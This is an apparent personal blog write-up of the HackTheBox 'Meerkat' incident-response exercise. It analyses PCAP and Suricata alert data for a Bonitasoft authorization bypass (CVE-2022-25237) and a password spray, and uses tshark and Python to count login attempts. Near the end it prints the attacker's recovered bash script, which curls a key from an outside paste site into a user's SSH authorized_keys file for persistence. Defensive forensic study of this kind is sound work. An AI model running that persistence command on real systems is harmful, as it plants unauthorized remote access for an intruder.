@@ -1,0 +1,199 @@
+<!DOCTYPE html> <html lang="en"> <head> <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"> <meta name="google-site-verification" content="uA_65eRzkHXUyK5QY2Pz3N0D7u0dyMoAHD_SQtaPvVA"> <title>Meerkat</title> <meta name="description" content="Investigated PCAPs and correlated log data."> <meta name="keywords" content="cybersecurity, CTF, web security, reverse engineering, pentesting, Linux, Python, malware analysis, exploit development"> <meta name="author" content="Biscotti Diskette"> <meta name="google-site-verification" content="uA_65eRzkHXUyK5QY2Pz3N0D7u0dyMoAHD_SQtaPvVA"> <meta property="og:type" content="website"> <meta property="og:title" content="Meerkat"> <meta property="og:description" content="Investigated PCAPs and correlated log data."> <meta property="og:url" content="https://biscottidiskette.github.io/boxes/62_meerkat/"> <meta property="og:image" content="https://biscottidiskette.github.io/assets/img/social-preview.png"> <meta property="og:site_name" content="Biscotti Diskette"> <meta name="twitter:card" content="summary_large_image"> <meta name="twitter:title" content="Meerkat"> <meta name="twitter:description" content="Investigated PCAPs and correlated log data."> <meta name="twitter:image" content="https://biscottidiskette.github.io/assets/img/social-preview.png"> <script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "Person",
+  "name": "Biscotti Diskette",
+  "url": "https://biscottidiskette.github.io",
+  "sameAs": [
+    
+  ],
+  "jobTitle": "Cybersecurity Researcher",
+  "worksFor": {
+    "@type": "Organization",
+    "name": "Independent",
+    "url": "https://biscottidiskette.github.io"
+  },
+  "image": "https://biscottidiskette.github.io/assets/img/social-preview.png",
+  "description": "Investigated PCAPs and correlated log data."
+}
+</script> <meta name="google-site-verification" content="uA_65eRzkHXUyK5QY2Pz3N0D7u0dyMoAHD_SQtaPvVA"> <meta http-equiv="Permissions-Policy" content="interest-cohort=()"> <meta charset="utf-8"> <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"> <meta http-equiv="X-UA-Compatible" content="IE=edge"> <title> Meerkat | Biscotti Diskette </title> <meta name="author" content="Biscotti Diskette"> <meta name="description" content="Investigated PCAPs and correlated log data."> <meta name="keywords" content="cybersecurity, CTF, web security, reverse engineering, pentesting, Linux, Python, malware analysis, exploit development"> <link rel="stylesheet" href="/assets/css/bootstrap.min.css?a4b3f509e79c54a512b890d73235ef04"> <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/mdbootstrap@4.20.0/css/mdb.min.css" integrity="sha256-jpjYvU3G3N6nrrBwXJoVEYI/0zw8htfFnhT9ljN3JJw=" crossorigin="anonymous"> <link defer rel="stylesheet" href="/assets/css/academicons.min.css?f0b7046b84e425c55f3463ac249818f5"> <link defer rel="stylesheet" href="/assets/css/scholar-icons.css?62b2ac103a88034e6882a5be5f3e2772"> <link defer rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css?family=Roboto:300,400,500,700|Roboto+Slab:100,300,400,500,700|Material+Icons&amp;display=swap"> <link defer rel="stylesheet" href="/assets/css/jekyll-pygments-themes-github.css?591dab5a4e56573bf4ef7fd332894c99" media="" id="highlight_theme_light"> <link rel="shortcut icon" href="/assets/img/frontpage/Logo3.png?4f879aeff848659581251777fe0ab074"> <link rel="stylesheet" href="/assets/css/main.css?d41d8cd98f00b204e9800998ecf8427e"> <link rel="stylesheet" href="/assets/css/terminal.css?bebbf314b8406d78caf98717f86a33c1"> <link rel="canonical" href="https://biscottidiskette.github.io/boxes/62_meerkat/"> <script src="/assets/js/theme.js?9a0c749ec5240d9cda97bc72359a72c0"></script> <link defer rel="stylesheet" href="/assets/css/jekyll-pygments-themes-native.css?5847e5ed4a4568527aa6cfab446049ca" media="none" id="highlight_theme_dark"> <script>
+    initTheme();
+  </script> <title>Meerkat</title> <meta name="description" content="Investigated PCAPs and correlated log data."> <meta name="keywords" content="cybersecurity, CTF, web security, reverse engineering, pentesting, Linux, Python, malware analysis, exploit development"> <meta name="author" content="Biscotti Diskette"> <meta name="google-site-verification" content="uA_65eRzkHXUyK5QY2Pz3N0D7u0dyMoAHD_SQtaPvVA"> <meta property="og:type" content="website"> <meta property="og:title" content="Meerkat"> <meta property="og:description" content="Investigated PCAPs and correlated log data."> <meta property="og:url" content="https://biscottidiskette.github.io/boxes/62_meerkat/"> <meta property="og:image" content="https://biscottidiskette.github.io/assets/img/social-preview.png"> <meta property="og:site_name" content="Biscotti Diskette"> <meta name="twitter:card" content="summary_large_image"> <meta name="twitter:title" content="Meerkat"> <meta name="twitter:description" content="Investigated PCAPs and correlated log data."> <meta name="twitter:image" content="https://biscottidiskette.github.io/assets/img/social-preview.png"> <script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "Person",
+  "name": "Biscotti Diskette",
+  "url": "https://biscottidiskette.github.io",
+  "sameAs": [
+    
+  ],
+  "jobTitle": "Cybersecurity Researcher",
+  "worksFor": {
+    "@type": "Organization",
+    "name": "Independent",
+    "url": "https://biscottidiskette.github.io"
+  },
+  "image": "https://biscottidiskette.github.io/assets/img/social-preview.png",
+  "description": "Investigated PCAPs and correlated log data."
+}
+</script> </head> <body class="fixed-top-nav sticky-bottom-footer"> <header> <nav id="navbar" class="navbar navbar-light navbar-expand-sm fixed-top" role="navigation"> <div class="container"> <a class="navbar-brand title font-weight-lighter" href="/"> Biscotti Diskette </a> <button class="navbar-toggler collapsed ml-auto" type="button" data-toggle="collapse" data-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation"> <span class="sr-only">Toggle navigation</span> <span class="icon-bar top-bar"></span> <span class="icon-bar middle-bar"></span> <span class="icon-bar bottom-bar"></span> </button> <div class="collapse navbar-collapse text-right" id="navbarNav"> <ul class="navbar-nav ml-auto flex-nowrap"> <li class="nav-item "> <a class="nav-link" href="/">about </a> </li> <li class="nav-item "> <a class="nav-link" href="/projects/">projects </a> </li> <li class="nav-item active"> <a class="nav-link" href="/boxes/">boxes <span class="sr-only">(current)</span> </a> </li> <li class="nav-item "> <a class="nav-link" href="/certifications/">certs </a> </li> <li class="nav-item "> <a class="nav-link" href="/repositories/">repos </a> </li> <li class="nav-item "> <a class="nav-link" href="/blog/">blog </a> </li> <li class="nav-item "> <a class="nav-link" href="/contact/">contact </a> </li> </ul> </div> </div> </nav> <progress id="progress" value="0"> <div class="progress-container"> <span class="progress-bar"></span> </div> </progress> </header> <div class="container mt-5" role="main"> <div class="post"> <header class="post-header"> <h1 class="post-title">Meerkat</h1> <p class="post-description">Investigated PCAPs and correlated log data.</p> </header> <article> <div class="row justify-content-sm-center"> <div class="col-sm-4 mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/meerkat/logo.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="HTB Meerkat" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </div> </div> <h2>Link</h2> <p><a href="https://app.hackthebox.com/sherlocks/Meerkat" rel="external nofollow noopener" target="_blank">Room Link</a></p> <p><br></p> <h2>Process</h2> <p><br> Here we are back again with a pcap and json and trying to figure out what is going on.</p> <p>First things first, let’s download the box files.</p> <div class="row justify-content-sm-center"> <div class="col-sm-8 mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/meerkat/download.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Download the files" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </div> </div> <p><br> The first step to begin the incident response is to identify the program that is running that could have potentially been compromised. Reviewing the logs, in some of the alerts, we see CVE-2022-25237. This is a Bonitasoft Authorization Bypass.</p> <div class="terminal" data-language="json" id="terminal-json-json-4913"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalClose('json-json-4913')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" onclick="terminalMinimize('json-json-4913')" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalMaximize('json-json-4913')" title="Maximize"></button> </div> <span class="terminal__title">json</span> <button class="terminal__copy" onclick="terminalCopy('json-json-4913')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body" id="terminal-body-json-json-4913">
+&lt;snip&gt;
+{
+    "ts": "2023-01-19T15:39:17.832239Z",
+    "event_type": "alert",
+    "src_ip": "138.199.59.221",
+    "src_port": 53401,
+    "dest_ip": "172.31.6.44",
+    "dest_port": 8080,
+    "vlan": null,
+    "proto": "TCP",
+    "app_proto": "http",
+    "alert": {
+      "severity": 1,
+      "signature": "ET EXPLOIT Bonitasoft Authorization Bypass and RCE Upload M1 (CVE-2022-25237)",
+      "category": "Attempted Administrator Privilege Gain",
+      "action": "allowed",
+      "signature_id": 2036821,
+      "gid": 1,
+      "rev": 1,
+      "metadata": {
+        "signature_severity": [
+          "Major"
+        ],
+        "former_category": [
+          "EXPLOIT"
+        ],
+        "attack_target": [
+          "Server"
+        ],
+        "deployment": [
+          "SSLDecrypt",
+          "Perimeter"
+        ],
+        "affected_product": null,
+        "created_at": [
+          "2022_06_03"
+        ],
+&lt;snip&gt;
+</pre> </div> <div class="terminal__overlay" id="overlay-json-json-4913" onclick="terminalOverlayClose('json-json-4913')"> <div class="terminal__modal" onclick="event.stopPropagation()"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalOverlayClose('json-json-4913')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalOverlayClose('json-json-4913')" title="Restore"></button> </div> <span class="terminal__title">json</span> <button class="terminal__copy" onclick="terminalCopyModal('json-json-4913')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body terminal__body--modal" id="terminal-modal-body-json-json-4913" data-language="json">
+&lt;snip&gt;
+{
+    "ts": "2023-01-19T15:39:17.832239Z",
+    "event_type": "alert",
+    "src_ip": "138.199.59.221",
+    "src_port": 53401,
+    "dest_ip": "172.31.6.44",
+    "dest_port": 8080,
+    "vlan": null,
+    "proto": "TCP",
+    "app_proto": "http",
+    "alert": {
+      "severity": 1,
+      "signature": "ET EXPLOIT Bonitasoft Authorization Bypass and RCE Upload M1 (CVE-2022-25237)",
+      "category": "Attempted Administrator Privilege Gain",
+      "action": "allowed",
+      "signature_id": 2036821,
+      "gid": 1,
+      "rev": 1,
+      "metadata": {
+        "signature_severity": [
+          "Major"
+        ],
+        "former_category": [
+          "EXPLOIT"
+        ],
+        "attack_target": [
+          "Server"
+        ],
+        "deployment": [
+          "SSLDecrypt",
+          "Perimeter"
+        ],
+        "affected_product": null,
+        "created_at": [
+          "2022_06_03"
+        ],
+&lt;snip&gt;
+</pre> </div> </div> <p><br> The next step is to identify the type of attack that we are are researching. Since we know that this is a type of Brute Force, that is a good place to start. We can check the MITRE for it and note the four types.</p> <div class="row justify-content-sm-center"> <div class="col-sm-8 mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/meerkat/bruteforce.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="MITRE Brute Force" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </div> </div> <p><a href="https://attack.mitre.org/techniques/T1110/" rel="external nofollow noopener" target="_blank">https://attack.mitre.org/techniques/T1110/</a></p> <p><br> After exploring the four subcategories, this attack looks like password spraying. It tries multiple credential combinations until it finds a valid combination. This matches the definition pretty much spot on.</p> <div class="row justify-content-sm-center"> <div class="col-sm-8 mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/meerkat/passpray.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="MITRE Password Spray" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </div> </div> <p><a href="https://attack.mitre.org/techniques/T1110/004/" rel="external nofollow noopener" target="_blank">https://attack.mitre.org/techniques/T1110/004/</a></p> <p><br> We should check the CVE catalog for the Authorization Bypass that we discovered earlier.</p> <div class="terminal" data-language="json" id="terminal-json-json-4392"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalClose('json-json-4392')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" onclick="terminalMinimize('json-json-4392')" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalMaximize('json-json-4392')" title="Maximize"></button> </div> <span class="terminal__title">json</span> <button class="terminal__copy" onclick="terminalCopy('json-json-4392')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body" id="terminal-body-json-json-4392">
+&lt;snip&gt;
+{
+    "ts": "2023-01-19T15:39:17.832239Z",
+    "event_type": "alert",
+    "src_ip": "138.199.59.221",
+    "src_port": 53401,
+    "dest_ip": "172.31.6.44",
+    "dest_port": 8080,
+    "vlan": null,
+    "proto": "TCP",
+    "app_proto": "http",
+    "alert": {
+      "severity": 1,
+      "signature": "ET EXPLOIT Bonitasoft Authorization Bypass and RCE Upload M1 (CVE-2022-25237)",
+&lt;snip&gt;
+</pre> </div> <div class="terminal__overlay" id="overlay-json-json-4392" onclick="terminalOverlayClose('json-json-4392')"> <div class="terminal__modal" onclick="event.stopPropagation()"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalOverlayClose('json-json-4392')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalOverlayClose('json-json-4392')" title="Restore"></button> </div> <span class="terminal__title">json</span> <button class="terminal__copy" onclick="terminalCopyModal('json-json-4392')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body terminal__body--modal" id="terminal-modal-body-json-json-4392" data-language="json">
+&lt;snip&gt;
+{
+    "ts": "2023-01-19T15:39:17.832239Z",
+    "event_type": "alert",
+    "src_ip": "138.199.59.221",
+    "src_port": 53401,
+    "dest_ip": "172.31.6.44",
+    "dest_port": 8080,
+    "vlan": null,
+    "proto": "TCP",
+    "app_proto": "http",
+    "alert": {
+      "severity": 1,
+      "signature": "ET EXPLOIT Bonitasoft Authorization Bypass and RCE Upload M1 (CVE-2022-25237)",
+&lt;snip&gt;
+</pre> </div> </div> <p><br> Cool so now that have an idea of what we are dealing with, we can check the PCAP in Wireshark to find the malicious string used to bypass authentication.</p> <div class="row justify-content-sm-center"> <div class="col-sm-8 mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/meerkat/attackstring.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Attack String" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </div> </div> <p><br> Another important step is to identify the number of login attempts in the spray. The first step is to find all the login attempts in WireShark and export it out for further analysis. We also need to exclude install:install logins because those are not associated with the password spray.</p> <div class="terminal" data-language="bash" id="terminal-bash-bash-4362"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalClose('bash-bash-4362')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" onclick="terminalMinimize('bash-bash-4362')" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalMaximize('bash-bash-4362')" title="Maximize"></button> </div> <span class="terminal__title">bash</span> <button class="terminal__copy" onclick="terminalCopy('bash-bash-4362')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body" id="terminal-body-bash-bash-4362">
+┌──(kali㉿kali)-[~/Desktop]
+└─$ tshark -r meerkat.pcap \
+  -Y 'http.request.method == "POST" &amp;&amp; http.request.uri contains "login" &amp;&amp; !(frame matches "username=install")' \
+  -T fields \
+  -E separator=$'\t' -E occurrence=f \
+  -e frame.number -e frame.time_epoch -e ip.src -e ip.dst -e http.request.uri -e http.content_type -e http.file_data \
+  &gt; posts_raw.tsv
+</pre> </div> <div class="terminal__overlay" id="overlay-bash-bash-4362" onclick="terminalOverlayClose('bash-bash-4362')"> <div class="terminal__modal" onclick="event.stopPropagation()"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalOverlayClose('bash-bash-4362')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalOverlayClose('bash-bash-4362')" title="Restore"></button> </div> <span class="terminal__title">bash</span> <button class="terminal__copy" onclick="terminalCopyModal('bash-bash-4362')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body terminal__body--modal" id="terminal-modal-body-bash-bash-4362" data-language="bash">
+┌──(kali㉿kali)-[~/Desktop]
+└─$ tshark -r meerkat.pcap \
+  -Y 'http.request.method == "POST" &amp;&amp; http.request.uri contains "login" &amp;&amp; !(frame matches "username=install")' \
+  -T fields \
+  -E separator=$'\t' -E occurrence=f \
+  -e frame.number -e frame.time_epoch -e ip.src -e ip.dst -e http.request.uri -e http.content_type -e http.file_data \
+  &gt; posts_raw.tsv
+</pre> </div> </div> <p><br> The WireShark output doesn’t account for duplicates. So we can write a python script to iterate the output and save it to a set. Finally, output the size of the set.</p> <div class="terminal" data-language="python" id="terminal-python-python-6196"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalClose('python-python-6196')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" onclick="terminalMinimize('python-python-6196')" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalMaximize('python-python-6196')" title="Maximize"></button> </div> <span class="terminal__title">python</span> <button class="terminal__copy" onclick="terminalCopy('python-python-6196')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body" id="terminal-body-python-python-6196">
+finalset = set()
+
+with open('/home/kali/Desktop/posts_raw.tsv','r') as fs:
+    for line in fs:
+        hashy = line.rstrip('\n').split('\t')[-1]
+        finalset.add(hashy)
+
+print(len(finalset))
+</pre> </div> <div class="terminal__overlay" id="overlay-python-python-6196" onclick="terminalOverlayClose('python-python-6196')"> <div class="terminal__modal" onclick="event.stopPropagation()"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalOverlayClose('python-python-6196')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalOverlayClose('python-python-6196')" title="Restore"></button> </div> <span class="terminal__title">python</span> <button class="terminal__copy" onclick="terminalCopyModal('python-python-6196')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body terminal__body--modal" id="terminal-modal-body-python-python-6196" data-language="python">
+finalset = set()
+
+with open('/home/kali/Desktop/posts_raw.tsv','r') as fs:
+    for line in fs:
+        hashy = line.rstrip('\n').split('\t')[-1]
+        finalset.add(hashy)
+
+print(len(finalset))
+</pre> </div> </div> <p><br> Run the script to find the number of password spray attempts.</p> <div class="terminal" data-language="bash" id="terminal-bash-bash-4235"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalClose('bash-bash-4235')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" onclick="terminalMinimize('bash-bash-4235')" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalMaximize('bash-bash-4235')" title="Maximize"></button> </div> <span class="terminal__title">bash</span> <button class="terminal__copy" onclick="terminalCopy('bash-bash-4235')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body" id="terminal-body-bash-bash-4235">
+============================================================================================== RESTART: /home/kali/Desktop/parse_0x00.py==============================================================================================
+56
+</pre> </div> <div class="terminal__overlay" id="overlay-bash-bash-4235" onclick="terminalOverlayClose('bash-bash-4235')"> <div class="terminal__modal" onclick="event.stopPropagation()"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalOverlayClose('bash-bash-4235')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalOverlayClose('bash-bash-4235')" title="Restore"></button> </div> <span class="terminal__title">bash</span> <button class="terminal__copy" onclick="terminalCopyModal('bash-bash-4235')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body terminal__body--modal" id="terminal-modal-body-bash-bash-4235" data-language="bash">
+============================================================================================== RESTART: /home/kali/Desktop/parse_0x00.py==============================================================================================
+56
+</pre> </div> </div> <p><br> Then, we can analyze the WireShark to find the one that is successful. So, scrolling to the bottom we can see a login request that returns a 204 instead of 401. This is our request.</p> <div class="row justify-content-sm-center"> <div class="col-sm-8 mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/meerkat/validlogin.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Valid Login" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </div> </div> <p><br> We should probably figure out where they are hosting the malicious file that they download. Reviewing the traffic in WireShark, we can see a wget command that shows what they downloaded.</p> <div class="row justify-content-sm-center"> <div class="col-sm-8 mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/meerkat/pastesio.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Download Link" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </div> </div> <p><br> Since it is posted, we can then view the script, see what it does, which files and folders it modifies, and what its name is.</p> <div class="terminal" data-language="bash" id="terminal-bash-bash-4113"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalClose('bash-bash-4113')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" onclick="terminalMinimize('bash-bash-4113')" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalMaximize('bash-bash-4113')" title="Maximize"></button> </div> <span class="terminal__title">bash</span> <button class="terminal__copy" onclick="terminalCopy('bash-bash-4113')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body" id="terminal-body-bash-bash-4113">
+#!/bin/bash
+curl https://pastes.io/raw/hffgra4unv &gt;&gt; /home/ubuntu/.ssh/authorized_keys
+sudo service ssh restart
+</pre> </div> <div class="terminal__overlay" id="overlay-bash-bash-4113" onclick="terminalOverlayClose('bash-bash-4113')"> <div class="terminal__modal" onclick="event.stopPropagation()"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalOverlayClose('bash-bash-4113')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalOverlayClose('bash-bash-4113')" title="Restore"></button> </div> <span class="terminal__title">bash</span> <button class="terminal__copy" onclick="terminalCopyModal('bash-bash-4113')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body terminal__body--modal" id="terminal-modal-body-bash-bash-4113" data-language="bash">
+#!/bin/bash
+curl https://pastes.io/raw/hffgra4unv &gt;&gt; /home/ubuntu/.ssh/authorized_keys
+sudo service ssh restart
+</pre> </div> </div> <p><a href="https://pastes.io/raw/bx5gcr0et8" rel="external nofollow noopener" target="_blank">https://pastes.io/raw/bx5gcr0et8</a></p> <p><br> The final step for this investigation is to confirm the technique ID of the persistence mechanism. Since we are manipulating authorized keys, we can search the MITRE framework for authorized keys.</p> <div class="row justify-content-sm-center"> <div class="col-sm-8 mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/meerkat/sshmitre.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="SSH Authorized Keys" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </div> </div> <p><a href="https://attack.mitre.org/techniques/T1098/004/" rel="external nofollow noopener" target="_blank">https://attack.mitre.org/techniques/T1098/004/</a></p> <p><br> And with that, we wrapped up another box. Hopefully, you enjoyed the read. See you in the next one.</p> </article> </div> </div> <footer class="sticky-bottom mt-5" role="contentinfo"> <div class="container"> © Copyright 2026 Biscotti Diskette  ·  <a href="https://github.com/biscottidiskette" target="_blank" rel="external nofollow noopener">GitHub</a>  ·  <a href="https://app.hackthebox.eu/profile/biscottidiskette" target="_blank" rel="external nofollow noopener">HackTheBox</a>  ·  <a href="https://tryhackme.com/r/p/BiscottiDiskette" target="_blank" rel="external nofollow noopener">TryHackMe</a>  ·  <a href="/contact/">Contact</a> </div> </footer> <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script> <script src="/assets/js/bootstrap.bundle.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/mdbootstrap@4.20.0/js/mdb.min.js" integrity="sha256-NdbiivsvWt7VYCt6hYNT3h/th9vSTL4EDWeGs5SN3DA=" crossorigin="anonymous"></script> <script defer src="https://cdn.jsdelivr.net/npm/masonry-layout@4.2.2/dist/masonry.pkgd.min.js" integrity="sha256-Nn1q/fx0H7SNLZMQ5Hw5JLaTRZp0yILA/FRexe19VdI=" crossorigin="anonymous"></script> <script defer 